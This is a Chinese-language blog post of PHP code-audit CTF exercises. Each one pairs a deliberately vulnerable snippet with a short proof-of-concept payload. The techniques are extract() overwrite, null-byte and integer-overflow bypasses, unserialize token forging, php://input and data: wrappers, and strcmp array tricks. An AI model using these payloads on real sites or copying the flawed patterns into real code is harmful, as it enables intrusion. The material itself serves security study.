<!DOCTYPE html>
<html>
    <!-- title -->




<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
    <meta name="author" content="n3k0">
    <meta name="renderer" content="webkit">
    <meta name="copyright" content="n3k0">
    <meta name="keywords" content="neko | n3k0">
    <meta name="description" content="incisive expression">
    <meta name="Cache-Control" content="no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
    <title>php审计 · n3k0</title>
    <style type="text/css">
    @font-face {
        font-family: 'Oswald-Regular';
        src: url("/font/Oswald-Regular.ttf");
    }

    body {
        margin: 0;
    }

    header,
    footer,
    .back-top,
    .sidebar,
    .container,
    .site-intro-meta,
    .toc-wrapper {
        display: none;
    }

    .site-intro {
        position: relative;
        z-index: 3;
        width: 100%;
        /* height: 50vh; */
        overflow: hidden;
    }

    .site-intro-placeholder {
        position: absolute;
        z-index: -2;
        top: 0;
        left: 0;
        width: calc(100% + 300px);
        height: 100%;
        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
        background-position: center center;
        transform: translate3d(-226px, 0, 0);
        animation: gradient-move 2.5s ease-out 0s 1;
    }

    @keyframes gradient-move {
        0% {
            transform: translate3d(-226px, 0, 0);
        }
        100% {
            transform: translate3d(0, 0, 0);
        }
    }

</style>

    <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
    <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
    
    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
        
    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
/* This file is meant as a standalone workflow for
- testing support for link[rel=preload]
- enabling async CSS loading in browsers that do not support rel=preload
- applying rel preload css once loaded, whether supported or not.
*/ -->
<script>
(function( w ){
	"use strict";
	// rel=preload support test
	if( !w.loadCSS ){
		w.loadCSS = function(){};
	}
	// define on the loadCSS obj
	var rp = loadCSS.relpreload = {};
	// rel=preload feature support test
	// runs once and returns a function for compat purposes
	rp.support = (function(){
		var ret;
		try {
			ret = w.document.createElement( "link" ).relList.supports( "preload" );
		} catch (e) {
			ret = false;
		}
		return function(){
			return ret;
		};
	})();

	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
	// then change that media back to its intended value on load
	rp.bindMediaToggle = function( link ){
		// remember existing media attr for ultimate state, or default to 'all'
		var finalMedia = link.media || "all";

		function enableStylesheet(){
			link.media = finalMedia;
		}

		// bind load handlers to enable media
		if( link.addEventListener ){
			link.addEventListener( "load", enableStylesheet );
		} else if( link.attachEvent ){
			link.attachEvent( "onload", enableStylesheet );
		}

		// Set rel and non-applicable media type to start an async request
		// note: timeout allows this to happen async to let rendering continue in IE
		setTimeout(function(){
			link.rel = "stylesheet";
			link.media = "only x";
		});
		// also enable media after 3 seconds,
		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
		setTimeout( enableStylesheet, 3000 );
	};

	// loop through link elements in DOM
	rp.poly = function(){
		// double check this to prevent external calls from running
		if( rp.support() ){
			return;
		}
		var links = w.document.getElementsByTagName( "link" );
		for( var i = 0; i < links.length; i++ ){
			var link = links[ i ];
			// qualify links to those with rel=preload and as=style attrs
			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
				// prevent rerunning on link
				link.setAttribute( "data-loadcss", true );
				// bind listeners to toggle media back
				rp.bindMediaToggle( link );
			}
		}
	};

	// if unsupported, run the polyfill
	if( !rp.support() ){
		// run once at least
		rp.poly();

		// rerun poly on an interval until onload
		var run = w.setInterval( rp.poly, 500 );
		if( w.addEventListener ){
			w.addEventListener( "load", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		} else if( w.attachEvent ){
			w.attachEvent( "onload", function(){
				rp.poly();
				w.clearInterval( run );
			} );
		}
	}


	// commonjs
	if( typeof exports !== "undefined" ){
		exports.loadCSS = loadCSS;
	}
	else {
		w.loadCSS = loadCSS;
	}
}( typeof global !== "undefined" ? global : this ) );
</script>

    <link rel="icon" href= "/assets/alice.png" />
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />    
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
    <link rel="preload" href="/scripts/main.js" as="script" />
    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
    <!-- 百度统计  -->
    
    <!-- 谷歌统计  -->
    
</head>

    
        <body class="post-body">
    
    
<header class="header">

    <div class="read-progress"></div>
    <div class="header-sidebar-menu">&#xe775;</div>
    <!-- post页的toggle banner  -->
    
    <div class="banner">
            <div class="blog-title">
                <a href="/" >NEKO</a>
            </div>
            <div class="post-title">
                <a href="#" class="post-name">php审计</a>
            </div>
    </div>
    
    <a class="home-link" href=/>NEKO</a>
</header>
    <div class="wrapper">
        <div class="site-intro" style=








height:50vh;

>
    
    <!-- 主页  -->
    
    
    <!-- 404页  -->
            
    <div class="site-intro-placeholder"></div>
    <div class="site-intro-img" style="background-image: url(https://i.loli.net/2018/12/11/5c0f263b5f34c.jpg)"></div>
    <div class="site-intro-meta">
        <!-- 标题  -->
        <h1 class="intro-title">
            <!-- 主页  -->
            
            php审计
            <!-- 404 -->
            
        </h1>
        <!-- 副标题 -->
        <p class="intro-subtitle">
            <!-- 主页副标题  -->
            
            
            <!-- 404 -->
            
        </p>
        <!-- 文章页meta -->
        
            <!-- 文章页标签  -->
            
                <div class= post-intro-tags >
    
        <a class="post-tag" href="javascript:void(0);" data-tags = "php审计">php审计</a>
    
</div>
            
            <div class="post-intro-meta">
                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
                <span class="post-intro-time">2018/01/28</span>
                
                
            </div>
        
    </div>
</div>
        <script>
  // load webfont-loader async, and add callback function
  function async(u, cb, err) {
    var d = document, t = 'script',
      o = d.createElement(t),
      s = d.getElementsByTagName(t)[0];
    o.src = u;
    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
    s.parentNode.insertBefore(o, s);
  }
  
  // get user agent
  var browser = {
    versions: function () {
      var u = window.navigator.userAgent;
      return {
        userAgent: u,
        trident: u.indexOf('Trident') > -1, //IE内核
        presto: u.indexOf('Presto') > -1, //opera内核
        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
        iPad: u.indexOf('iPad') > -1, //是否为iPad
        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
      };
    }()
  }
  console.log("userAgent:" + browser.versions.userAgent);

  // callback
  function fontLoaded() {
    console.log('font loaded');
    if (document.getElementsByClassName('site-intro-meta')) {
      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
      if (postIntroTags) {
        postIntroTags.classList.add('post-fade-in');
      }
      if (postIntroMeat) {
        postIntroMeat.classList.add('post-fade-in');
      }
    }
  }

  // UC不支持跨域，所以直接显示
  function asyncCb(){
    if (browser.versions.uc) {
      console.log("UCBrowser");
      fontLoaded();
    } else {
      WebFont.load({
        custom: {
          families: ['Oswald-Regular']
        },
        loading: function () {  //所有字体开始加载
          // console.log('loading');
        },
        active: function () {  //所有字体已渲染
          fontLoaded();
        },
        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
          console.log('inactive: timeout');
          fontLoaded();
        },
        timeout: 5000 // Set the timeout to two seconds
      });
    }
  }

  function asyncErr(){
    console.warn('script load from CDN failed, will load local script')
  }

  var asyncLoadWithFallBack = function(arr, success, reject) {
      var currReject = function(){
        reject()
        arr.shift()
        if(arr.length)
          async(arr[0], success, currReject)
        }

      async(arr[0], success, currReject)
  }

  asyncLoadWithFallBack([
    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
    "/lib/webfontloader.min.js"
  ], asyncCb, asyncErr)
</script>        
        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
        <div class="container container-unloaded">
            <main class="main post-page">
    <article class="article-entry">
        <p>参考:<a href="https://github.com/bowu678/php_bugs" target="_blank" rel="noopener">https://github.com/bowu678/php_bugs</a></p>
<h1 id="extract覆盖"><a href="#extract覆盖" class="headerlink" title="extract覆盖"></a>extract覆盖</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &apos;flag.php&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if (isset($shiyan)) &#123;</span><br><span class="line">	$content = trim(file_get_contents($flag));</span><br><span class="line">	if ($shiyan == $content) &#123;</span><br><span class="line">		echo &apos;ctf&#123;xxx&#125;&apos;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &apos;Oh.no&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?shiyan=&amp;flag=neko!</span><br></pre></td></tr></table></figure></p>
<p>再来一道:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: ZTS</span><br><span class="line"> * Date: 2017/12/15</span><br><span class="line"> * Time: 10:22</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">$filename = &apos;flag08395e0fda9cae71.txt&apos;;</span><br><span class="line">$flag = &apos;flag08395e0fda9cae71.txt&apos;;</span><br><span class="line"></span><br><span class="line">extract($_GET); //extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。</span><br><span class="line"></span><br><span class="line">if (isset($attempt)) &#123;</span><br><span class="line">	$combination = trim(file_get_contents($filename)); //trim() 函数移除字符串两侧的空白字符或其他预定义字符。/</span><br><span class="line"></span><br><span class="line">	if ($attempt === $combination) &#123;</span><br><span class="line">		echo &quot;&lt;p&gt;How did you know the secret combinnation was&quot; . &quot;$combination !?&lt;/p&gt;&quot;;</span><br><span class="line">		$next = file_get_contents($flag);</span><br><span class="line">		echo $next;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;Incorrect! The secret combiantion is not $attempt&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?attempt=&amp;filename=asdasndajsdnksad</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>extract()可以覆盖变量，file_get_contents()找不到文件名时返回null，让shiyan为空即可</p>
<h1 id="is-number-amp-回文数绕过"><a href="#is-number-amp-回文数绕过" class="headerlink" title="is_number&amp;回文数绕过"></a>is_number&amp;回文数绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;</span><br><span class="line"> </span><br><span class="line">ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值</span><br><span class="line">error_reporting(0); //关闭所有PHP错误报告</span><br><span class="line"> </span><br><span class="line">if(!isset($_GET[&apos;number&apos;]))&#123;</span><br><span class="line">   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt</span><br><span class="line"> </span><br><span class="line">   die(&quot;have a fun!!&quot;); //die — 等同于 exit()</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">foreach([$_GET, $_POST] as $global_var) &#123;  //foreach 语法结构提供了遍历数组的简单方式 </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）</span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串</span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); //strval — 获取变量的字符串值</span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; //strlen — 获取字符串长度</span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;])) //is_numeric — 检测变量是否为数字或数字字符串 </span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;]))) //intval — 获取变量的整数值</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"> </span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line"> </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;</span><br><span class="line">          else</span><br><span class="line">          &#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?number=%00%c12321</span><br><span class="line">?number=%002147483647</span><br></pre></td></tr></table></figure></p>
<p>原理:00截断绕过is_numeric(),%0c是\f换页符，intval()和strrev()无视%00和%0c,但是判断回文数的时候就不会无视了，至于为什么是/f,因为trim()会过滤\n\r\t\v\0但不会过滤\f。<br>第二种解法是因为32位系统intval()能接受的最大值为2147483647，64位能接受的最大值为9223372036854775807，64位的payload为?number=%0009223372036854775807要加个0，因为这个数反过来小于9223372036854775807，然而我明明是64位机器，复现却要用32的payload。<br>参考:<a href="http://www.chnpanda.com/961.html" target="_blank" rel="noopener">http://www.chnpanda.com/961.html</a></p>
<h1 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;common.php&apos;;</span><br><span class="line">$flag = &quot;neko!!&quot;;</span><br><span class="line">$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">//把一个或多个数组合并为一个数组</span><br><span class="line">class db &#123;</span><br><span class="line">	public $where;</span><br><span class="line">	function __wakeup() &#123;</span><br><span class="line">		if (!empty($this-&gt;where)) &#123;</span><br><span class="line">			$this-&gt;select($this-&gt;where);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	function select($where) &#123;</span><br><span class="line">		$sql = mysql_query(&apos;select * from user where &apos; . $where);</span><br><span class="line">		//函数执行一条 MySQL 查询。</span><br><span class="line">		return @mysql_fetch_array($sql);</span><br><span class="line">		//从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($requset[&apos;token&apos;]))</span><br><span class="line">//测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。</span><br><span class="line">&#123;</span><br><span class="line">	$login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;])));</span><br><span class="line">	//gzuncompress:进行字符串压缩</span><br><span class="line">	//unserialize: 将已序列化的字符串还原回 PHP 的值</span><br><span class="line"></span><br><span class="line">	$db = new db();</span><br><span class="line">	$row = $db-&gt;select(&apos;user=\&apos;&apos; . mysql_real_escape_string($login[&apos;user&apos;]) . &apos;\&apos;&apos;);</span><br><span class="line">	//mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</span><br><span class="line"></span><br><span class="line">	if ($login[&apos;user&apos;] === &apos;ichunqiu&apos;) &#123;</span><br><span class="line">		echo $flag;</span><br><span class="line">	&#125; else if ($row[&apos;pass&apos;] !== $login[&apos;pass&apos;]) &#123;</span><br><span class="line">		echo &apos;unserialize injection!!&apos;;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &quot;(╯‵□′)╯︵┴─┴ &quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	header(&apos;Location: index.php?error=1&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr = array([&apos;user&apos;] === &apos;ichunqiu&apos;);</span><br><span class="line">$token = base64_encode(gzcompress(serialize($arr)));</span><br><span class="line">print_r($token);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>不要用array(‘user’=&gt;’ichunqiu’)</p>
<h1 id="with-rollup"><a href="#with-rollup" class="headerlink" title="with rollup"></a>with rollup</h1><p><a href="http://www.shiyanbar.com/ctf/1940" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1940</a><br>其实就一个用法:<br>group by pwd with rollup limit 1 offset 2%23 测试出只有两行数据后，后再group by pwd with rollup,就会多出一行，其中pwd为NULL</p>
<h1 id="ereg绕过及php弱语言性质"><a href="#ereg绕过及php弱语言性质" class="headerlink" title="ereg绕过及php弱语言性质"></a>ereg绕过及php弱语言性质</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">	if (ereg(&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) &#123;</span><br><span class="line">		echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;</span><br><span class="line">	&#125; else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) &#123;</span><br><span class="line">		if (strpos($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置</span><br><span class="line">		&#123;</span><br><span class="line">			die(&apos;Flag: &apos; . $flag);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			echo (&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">password=1e8%00*-*</span><br><span class="line">?password[]=1e8*-*</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>ereg检查到%00就不会往下检查了，这里把===改成==也是可以绕过的。<br>strlen()不算%00，php是弱语言解析到1e8之后解析不出来就只解析1e8，并不是%00截断什么的。<br>第二个poc是利用===，由于ereg是处理字符串的，传入数组就会返回NULL即FALSE。</p>
<h1 id="eregi-file-get-contents绕过"><a href="#eregi-file-get-contents绕过" class="headerlink" title="eregi,file_get_contents绕过"></a>eregi,file_get_contents绕过</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];</span><br><span class="line">$data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br><span class="line">&#123;	</span><br><span class="line">    echo &quot;neko!!&quot;;</span><br><span class="line">&#125;else</span><br><span class="line">&#123;</span><br><span class="line">    print &quot;work harder!harder!harder!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=0&amp;a=php://input&amp;b=%0011111</span><br><span class="line">post:1112 is a nice lab!</span><br><span class="line"></span><br><span class="line">或者:</span><br><span class="line">?id=a&amp;a=data:,1112 is a nice lab!&amp;b=%00111111</span><br></pre></td></tr></table></figure></p>
<p>原理:<br>id也可以用字母和.绕过，php里’.’==0，字母也是，file_get_contents用php伪协议绕过或者用data协议绕过,eregi()和ereg()一样执行到%00就不继续了，所以条件就变成<code>eregi(&quot;111&quot;,&quot;1114&quot;)</code>为1.</p>
<h1 id="数组绕过strcmp"><a href="#数组绕过strcmp" class="headerlink" title="数组绕过strcmp"></a>数组绕过strcmp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;  </span><br><span class="line">    if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 </span><br><span class="line"></span><br><span class="line">    //比较两个字符串（区分大小写） </span><br><span class="line">        die(&apos;Flag: &apos;.$flag);  </span><br><span class="line">    else  </span><br><span class="line">        print &apos;No&apos;;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>poc:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1</span><br></pre></td></tr></table></figure></p>
